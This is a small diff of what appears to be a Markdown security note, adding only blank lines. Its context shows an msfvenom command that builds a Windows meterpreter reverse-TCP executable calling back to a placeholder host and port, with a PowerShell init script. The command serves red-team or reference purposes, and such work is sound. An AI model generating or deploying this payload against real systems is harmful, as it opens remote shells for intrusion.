@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:24:56.696544+00:00'
 ```bash
 msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
 ```
+
+
